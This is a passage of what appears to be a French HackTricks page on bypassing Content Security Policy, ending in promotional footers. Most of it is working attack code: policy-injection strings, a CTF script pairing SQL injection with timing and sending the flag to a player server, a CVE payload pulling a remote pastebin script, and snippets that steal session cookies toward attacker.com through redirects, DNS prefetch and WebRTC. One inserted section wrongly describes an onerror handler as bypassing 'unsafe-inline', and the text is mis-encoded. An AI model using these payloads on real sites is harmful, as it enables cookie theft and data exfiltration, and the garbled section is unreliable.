**Recherche :** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Si un **param√®tre** envoy√© par vous est **coll√© √† l'int√©rieur** de la **d√©claration** de la **politique**, alors vous pourriez **modifier** la **politique** de mani√®re √† la rendre **inutile**. Vous pourriez **autoriser le script 'unsafe-inline'** avec l'une de ces contournements :
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Parce que cette directive va **√©craser les directives script-src existantes**.\
Vous pouvez trouver un exemple ici: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Dans Edge, c'est beaucoup plus simple. Si vous pouvez ajouter dans le CSP juste ceci: **`;_`** **Edge** **supprimerait** l'ensemble de la **politique**.\
Exemple: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; via XSS (iframe) - Attaque temporelle

Remarquez l'absence de la directive `'unsafe-inline'`\
Cette fois, vous pouvez faire en sorte que la victime **charge** une page sous **votre contr√¥le** via **XSS** avec un `<iframe>`. Cette fois, vous allez faire en sorte que la victime acc√®de √† la page √† partir de laquelle vous souhaitez extraire des informations (**CSRF**). Vous ne pouvez pas acc√©der au contenu de la page, mais si d'une mani√®re ou d'une autre vous pouvez **contr√¥ler le temps n√©cessaire au chargement de la page**, vous pouvez extraire les informations dont vous avez besoin.

Cette fois, un **drapeau** va √™tre extrait, chaque fois qu'un **caract√®re est correctement devin√©** via SQLi, la **r√©ponse** prend **plus de temps** en raison de la fonction de pause. Ensuite, vous pourrez extraire le drapeau:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bookmarklets

Cette attaque impliquerait une certaine ing√©nierie sociale o√π l'attaquant **convainc l'utilisateur de faire glisser et d√©poser un lien sur le bookmarklet du navigateur**. Ce bookmarklet contiendrait du **code javascript malveillant** qui, lorsqu'il est gliss√© et d√©pos√© ou cliqu√©, serait ex√©cut√© dans le contexte de la fen√™tre web actuelle, **contournant la CSP et permettant de voler des informations sensibles** telles que des cookies ou des jetons.

Pour plus d'informations, [**consultez le rapport original ici**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Contournement de la CSP en restreignant la CSP

Dans [**ce compte rendu de CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), la CSP est contourn√©e en injectant √† l'int√©rieur d'un iframe autoris√© une CSP plus restrictive qui interdisait le chargement d'un fichier JS sp√©cifique qui, ensuite, via la **pollution de prototype** ou le **dom clobbering** permettait d'**exploiter un script diff√©rent pour charger un script arbitraire**.

Vous pouvez **restreindre une CSP d'un iframe** avec l'attribut **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

Dans [**ce compte rendu de CTF**](https://github.com/aszx87410/ctf-writeups/issues/48), il √©tait possible via une **injection HTML** de **restreindre** davantage un **CSP** afin qu'un script emp√™chant CSTI soit d√©sactiv√© et donc que la **vuln√©rabilit√© devienne exploitable.**\
Le CSP peut √™tre rendu plus restrictif en utilisant des **balises meta HTML** et les scripts en ligne peuvent √™tre d√©sactiv√©s **en supprimant** l'**entr√©e** autorisant leur **nonce** et **en activant des scripts en ligne sp√©cifiques via sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Exfiltration JS avec Content-Security-Policy-Report-Only

Si vous parvenez √† faire en sorte que le serveur r√©ponde avec l'en-t√™te **`Content-Security-Policy-Report-Only`** avec une **valeur contr√¥l√©e par vous** (peut-√™tre √† cause d'un CRLF), vous pourriez le faire pointer vers votre serveur et si vous **enveloppez** le **contenu JS** que vous souhaitez exfiltrer avec **`<script>`** et parce que `unsafe-inline` est tr√®s probablement interdit par le CSP, cela **d√©clenchera une erreur CSP** et une partie du script (contenant les informations sensibles) sera envoy√©e au serveur depuis `Content-Security-Policy-Report-Only`.

Pour un exemple, consultez ce [**writeup CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Fuite d'informations avec CSP et Iframe

* Un `iframe` est cr√©√© qui pointe vers une URL (appelons-la `https://example.redirect.com`) qui est autoris√©e par CSP.
* Cette URL redirige ensuite vers une URL secr√®te (par exemple, `https://usersecret.example2.com`) qui n'est **pas autoris√©e** par CSP.
* En √©coutant l'√©v√©nement `securitypolicyviolation`, on peut capturer la propri√©t√© `blockedURI`. Cette propri√©t√© r√©v√®le le domaine de l'URI bloqu√©e, divulguant le domaine secret vers lequel l'URL initiale a redirig√©.

Il est int√©ressant de noter que des navigateurs comme Chrome et Firefox ont des comportements diff√©rents dans la gestion des iframes par rapport √† CSP, ce qui peut entra√Æner une fuite potentielle d'informations sensibles en raison d'un comportement ind√©fini.

Une autre technique implique d'exploiter le CSP lui-m√™me pour d√©duire le sous-domaine secret. Cette m√©thode repose sur un algorithme de recherche binaire et sur l'ajustement du CSP pour inclure des domaines sp√©cifiques qui sont d√©lib√©r√©ment bloqu√©s. Par exemple, si le sous-domaine secret est compos√© de caract√®res inconnus, vous pouvez tester de mani√®re it√©rative diff√©rents sous-domaines en modifiant la directive CSP pour bloquer ou autoriser ces sous-domaines. Voici un extrait montrant comment le CSP pourrait √™tre configur√© pour faciliter cette m√©thode:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
En surveillant quelles requ√™tes sont bloqu√©es ou autoris√©es par la CSP, on peut r√©duire les caract√®res possibles dans le sous-domaine secret, finalement d√©couvrant l'URL compl√®te.

Les deux m√©thodes exploitent les subtilit√©s de la mise en ≈ìuvre de la CSP et du comportement dans les navigateurs, d√©montrant comment des politiques en apparence s√©curis√©es peuvent involontairement divulguer des informations sensibles.

Astuce provenant de [**ici**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes en bugs !

**Perspectives de Hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en √©volution rapide gr√¢ce aux actualit√©s et aux perspectives en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Technologies Non S√©curis√©es pour Contourner la CSP

### Erreurs PHP lorsqu'il y a trop de param√®tres

Selon la [**derni√®re technique comment√©e dans cette vid√©o**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), l'envoi de trop de param√®tres (1001 param√®tres GET bien que vous puissiez √©galement le faire avec des param√®tres POST et plus de 20 fichiers). Tout **`header()`** d√©fini dans le code web PHP **ne sera pas envoy√©** en raison de l'erreur que cela d√©clenchera.

### Surcharge du tampon de r√©ponse PHP

PHP est connu pour **mettre en m√©moire tampon la r√©ponse √† 4096** octets par d√©faut. Par cons√©quent, si PHP affiche un avertissement, en fournissant **suffisamment de donn√©es √† l'int√©rieur des avertissements**, la **r√©ponse** sera **envoy√©e** **avant** l'**en-t√™te CSP**, provoquant l'ignorance de l'en-t√™te.\
Ensuite, la technique consiste essentiellement √† **remplir le tampon de r√©ponse avec des avertissements** pour que l'en-t√™te CSP ne soit pas envoy√©.

Id√©e provenant de [**cette explication**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### R√©√©crire la Page d'Erreur

D'apr√®s [**cette explication**](https://blog.ssrf.kr/69), il semble qu'il √©tait possible de contourner une protection CSP en chargeant une page d'erreur (potentiellement sans CSP) et en r√©√©crivant son contenu.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME est une technique qui abuse d'une XSS (ou d'une XSS tr√®s limit√©e) **dans un point de terminaison d'une page** pour **abuser** **d'autres points de terminaison de la m√™me origine.** Cela se fait en chargeant le point de terminaison vuln√©rable √† partir d'une page d'attaquant, puis en actualisant la page de l'attaquant vers le vrai point de terminaison dans la m√™me origine que vous souhaitez abuser. De cette mani√®re, le **point de terminaison vuln√©rable** peut utiliser l'objet **`opener`** dans le **payload** pour **acc√©der au DOM** du **vrai point de terminaison √† abuser**. Pour plus d'informations, consultez :

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

De plus, **wordpress** a un point de terminaison **JSONP** dans `/wp-json/wp/v2/users/1?_jsonp=data` qui va **refl√©ter** les **donn√©es** envoy√©es en sortie (avec la limitation aux lettres, chiffres et points).

Un attaquant peut abuser de ce point de terminaison pour **g√©n√©rer une attaque SOME** contre WordPress et **l'int√©grer** √† l'int√©rieur de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` notez que ce **script** sera **charg√©** car il est **autoris√© par 'self'**. De plus, et parce que WordPress est install√©, un attaquant pourrait abuser de l'**attaque SOME** √† travers le **point de terminaison de rappel** **vuln√©rable** qui **contourne le CSP** pour donner plus de privil√®ges √† un utilisateur, installer un nouveau plugin...\
Pour plus d'informations sur la fa√ßon d'effectuer cette attaque, consultez [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Contournements de l'exfiltration CSP

S'il y a un CSP strict qui ne vous permet pas d'**interagir avec des serveurs externes**, il y a quelques choses que vous pouvez toujours faire pour exfiltrer l'information.

### Location

Vous pourriez simplement mettre √† jour l'emplacement pour envoyer au serveur de l'attaquant les informations secr√®tes :
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Balise Meta

Vous pourriez rediriger en injectant une balise meta (il s'agit simplement d'une redirection, cela ne divulguera pas de contenu)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### Pr√©chargement DNS

Pour charger les pages plus rapidement, les navigateurs vont pr√©-r√©soudre les noms d'h√¥tes en adresses IP et les mettre en cache pour une utilisation ult√©rieure.\
Vous pouvez indiquer √† un navigateur de pr√©-r√©soudre un nom d'h√¥te avec : `<link rel="dns-prefetch" href="something.com">`

Vous pourriez abuser de ce comportement pour **exfiltrer des informations sensibles via des requ√™tes DNS** :
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
### Contournement de la politique de s√©curit√© du contenu (CSP)

---

#### Contournement de CSP en utilisant `unsafe-inline`

La directive `unsafe-inline` dans une CSP permet l'ex√©cution de scripts en ligne, ce qui peut √™tre exploit√© par un attaquant pour ex√©cuter du code malveillant. Pour contourner cette restriction, l'attaquant peut utiliser des techniques telles que l'injection de code JavaScript directement dans les attributs d'√©v√©nement HTML, comme suit :

```html
<img src="image.jpg" onerror="alert('XSS attack!')">
```

En utilisant cette technique, l'attaquant peut contourner la directive `unsafe-inline` et ex√©cuter du code JavaScript malveillant sur la page web cibl√©e.
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Pour √©viter que cela ne se produise, le serveur peut envoyer l'en-t√™te HTTP :
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Apparemment, cette technique ne fonctionne pas dans les navigateurs sans t√™te (bots)
{% endhint %}

### WebRTC

Sur plusieurs pages, vous pouvez lire que **WebRTC ne v√©rifie pas la politique `connect-src`** du CSP.

En fait, vous pouvez _fuir_ des informations en utilisant une _requ√™te DNS_. Consultez ce code :
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Une autre option :
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## V√©rification des politiques CSP en ligne

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Cr√©ation automatique de CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## R√©f√©rences

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

‚Äã

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes en bugs !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez inform√© du monde du piratage en √©volution rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
